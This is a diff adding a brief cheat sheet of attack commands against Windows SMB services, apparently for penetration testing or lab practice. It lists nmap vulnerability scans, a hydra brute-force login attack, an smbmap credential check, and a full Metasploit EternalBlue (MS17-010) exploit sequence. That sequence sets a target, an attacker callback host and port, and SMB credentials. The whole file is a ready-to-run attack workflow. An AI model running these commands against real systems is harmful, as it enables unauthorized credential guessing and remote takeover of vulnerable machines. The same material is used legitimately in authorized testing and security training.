@@ -1,0 +1,22 @@
+# Nmap Scans
+nmap <target_IP> -A
+find / -name *.nse | grep smb 
+nmap <target_ IP> -p 445 -sV --script smb-vuln*
+
+#BruteFroce Scan
+hydra -L /root/username.txt -P /root/password.txt smb://<target_IP> -V 
+
+#SMP authenticate Scan
+smbmap -H <target_ IP> -u username -p password 
+
+# Metasploit
+msfconsole
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+options
+set RHOSTS <target_IP>
+set LHOST <attack_IP>
+set LPORT 4567
+set SMBUSER forensic
+set SMBPASS admin
+exploit
